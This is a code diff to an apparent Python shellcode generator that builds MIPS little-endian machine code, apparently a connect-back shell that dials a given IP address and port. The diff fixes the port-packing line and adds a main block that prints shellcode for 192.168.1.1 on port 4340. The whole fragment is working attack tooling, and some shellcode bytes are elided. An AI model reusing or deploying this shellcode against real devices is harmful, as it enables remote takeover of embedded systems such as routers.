@@ -11,7 +11,7 @@ import socket
 def make_shellcode(dst_ip, dst_port):
     host = socket.ntohl(struct.unpack('I', socket.inet_aton(dst_ip))[0])
     ip = struct.unpack('cccc', struct.pack('<L', host))
-    port = struct.unpack('cccc', struct.pack('<L', ip))
+    port = struct.unpack('cccc', struct.pack('<L', dst_port))
 
     # Close stdin(0)
     mipsel_shell  = "\xff\xff\x04\x28"  # slti $a0, $zero, 0xFFFF
@@ -101,3 +101,6 @@ def make_shellcode(dst_ip, dst_port):
     mipsel_shell += "\x0c\x09\x09\x01"  # syscall 0x42424
 
     return mipsel_shell
+
+if __name__ == '__main__':
+    print make_shellcode("192.168.1.1", 4340)
